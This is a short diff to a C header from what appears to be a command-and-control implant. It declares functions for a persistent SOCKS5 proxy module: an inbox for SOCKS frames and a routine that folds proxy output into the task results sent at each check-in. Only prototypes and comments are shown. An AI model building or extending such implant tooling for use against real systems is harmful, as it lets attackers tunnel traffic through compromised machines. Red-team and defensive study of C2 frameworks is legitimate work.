@@ -184,6 +184,19 @@ void execute_task(IMPLANT_CONTEXT *ctx, TASK *task);
 DWORD parse_task_type(const char *type_str, DWORD len);
 
 /**
+ * Enqueue/dequeue raw SOCKS_MSG frames for the long-running socks5 module.
+ * bus_file_read maps "\\.\socks\inbox" to task_socks_inbox_read().
+ */
+BOOL task_socks_inbox_write(const BYTE *data, DWORD len);
+DWORD task_socks_inbox_read(BYTE *buf, DWORD len);
+
+/**
+ * Drain output from persistent SOCKS modules into synthetic task results.
+ * Called immediately before each check-in payload is built.
+ */
+void task_collect_socks_output(IMPLANT_CONTEXT *ctx);
+
+/**
  * Free dynamically allocated task data buffers.
  * Called after tasks have been executed and results collected.
  */
